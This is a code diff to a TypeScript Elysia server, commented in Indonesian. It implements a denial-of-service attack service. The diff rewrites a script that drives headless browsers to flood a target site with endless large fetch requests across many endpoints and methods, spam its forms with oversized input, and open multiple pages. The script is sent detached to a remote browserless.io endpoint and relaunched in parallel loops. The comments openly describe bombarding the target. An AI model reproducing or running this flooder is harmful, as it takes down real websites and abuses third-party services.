@@ -363,94 +363,91 @@ export const app = new Elysia()
 
     // Skrip yang sangat agresif untuk membombardir target melalui headless browser
     const attackScript = `
-export default async ({ page, context }) => {
-  const targetUrl = context.url;
-  const browser = page.browser();
+      export default async ({ page, context }) => {
+        const targetUrl = context.url;
+        const baseUrl = targetUrl.endsWith('/') ? targetUrl : targetUrl + '/';
+        
+        // Fungsi untuk membombardir dengan fetch dalam jumlah besar
+        const flood = async () => {
+          const payload = 'A'.repeat(1024 * 200); // 200 KB
+          const endpoints = ['/', '/api', '/login', '/register', '/search', '/submit', '/contact'];
+          const methods = ['GET', 'POST', 'PUT', 'DELETE'];
+          while (true) {
+            const tasks = [];
+            for (let i = 0; i < 50; i++) {
+              const method = methods[i % methods.length];
+              const endpoint = endpoints[i % endpoints.length];
+              tasks.push(
+                fetch(baseUrl + endpoint, {
+                  method,
+                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                  body: method === 'GET' ? undefined : payload,
+                  mode: 'no-cors'
+                }).catch(() => {})
+              );
+            }
+            await Promise.all(tasks);
+            await new Promise(r => setTimeout(r, 5));
+          }
+        };
 
-  const attackPage = async (p) => {
-    try {
-      await p.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
-    } catch (e) {}
+        // Serang melalui submit form
+        const spamForms = async () => {
+          while (true) {
+            const forms = document.querySelectorAll('form');
+            for (const form of forms) {
+              const inputs = form.querySelectorAll('input:not([type=submit])');
+              for (const inp of inputs) {
+                try { inp.value = 'X'.repeat(10000); } catch(e) {}
+              }
+              try { form.submit(); } catch(e) {}
+            }
+            await new Promise(r => setTimeout(r, 300));
+          }
+        };
 
-    // Infinite storm of HTTP requests (fetch)
-    p.evaluate(async (baseUrl) => {
-      const bigPayload = 'A'.repeat(1024 * 200); // 200 KB per request
-      const endpoints = ['/', '/api', '/login', '/register', '/search', '/submit', '/contact', '/admin', '/wp-admin', '/.env'];
-      const methods = ['GET', 'POST', 'PUT', 'DELETE'];
-      while (true) {
-        const promises = [];
-        for (let i = 0; i < 30; i++) {
-          const method = methods[i % methods.length];
-          const endpoint = endpoints[i % endpoints.length];
-          const url = baseUrl + endpoint;
-          promises.push(
-            fetch(url, {
-              method,
-              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-              body: method === 'GET' ? undefined : bigPayload,
-              mode: 'no-cors',
-            }).catch(() => {})
-          );
+        // Buka banyak halaman sekaligus
+        const browser = page.browser();
+        for (let i = 0; i < 5; i++) {
+          browser.newPage().then(p => {
+            p.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
+            flood();
+            spamForms();
+          }).catch(() => {});
         }
-        await Promise.all(promises);
-        await new Promise(resolve => setTimeout(resolve, 5));
+
+        // Serang di halaman utama
+        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {});
+        flood();
+        spamForms();
+
+        // Biarkan berjalan selama 1 menit
+        await new Promise(resolve => setTimeout(resolve, 60000));
+        return { data: { status: 'attack_complete' }, type: 'application/json' };
       }
-    }, targetUrl).catch(() => {});
+    `;
 
-    // Infinite form submission with huge data
-    p.evaluate(async () => {
-      while (true) {
-        const forms = document.querySelectorAll('form');
-        for (const form of forms) {
-          const inputs = form.querySelectorAll('input:not([type=submit])');
-          inputs.forEach(inp => { inp.value = 'X'.repeat(10000); });
-          form.submit();
-        }
-        await new Promise(r => setTimeout(r, 200));
-      }
-    }).catch(() => {});
-  };
-
-  // Create many pages to multiply the damage
-  const pageCount = 8;
-  for (let i = 0; i < pageCount; i++) {
-    browser.newPage().then(newPage => {
-      attackPage(newPage);
-    }).catch(() => {});
-  }
-  attackPage(page);
-
-  // Keep the function alive for a minute so the browser stays active
-  await new Promise(resolve => setTimeout(resolve, 60000));
-  return { data: { status: 'attacking' }, type: 'application/json' };
-}`;
-
-    // Jalankan satu serangan (detached, tidak menunggu selesai)
     const executeAttack = async () => {
       try {
-        await fetch(
-          `https://production-sfo.browserless.io/function?token=${apiKey}&detach=true`,
-          {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code: attackScript, context: { url } }),
-          }
-        );
+        await fetch(`https://production-sfo.browserless.io/function?token=${apiKey}&detach=true`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code: attackScript, context: { url } }),
+        });
       } catch (e) {
-        // ignore network errors
+        // abaikan error jaringan
       }
     };
 
     if (loop) {
-      // Luncurkan beberapa loop paralel untuk efek berkelanjutan
-      const interval = intervalMs || 1000;
-      const concurrency = 5; // semakin banyak semakin berbahaya
+      const interval = intervalMs || 2000;
+      const concurrency = 3; // jumlah worker paralel
       for (let i = 0; i < concurrency; i++) {
-        const attackLoop = async () => {
+        const loopAttack = async () => {
           await executeAttack();
-          setTimeout(attackLoop, interval);
+          setTimeout(loopAttack, interval);
         };
-        attackLoop(); // start without awaiting
+        loopAttack(); // jalankan tanpa menunggu
       }
       return { success: true, message: `Serangan browserless berkelanjutan dimulai dengan ${concurrency} worker paralel` };
     } else {
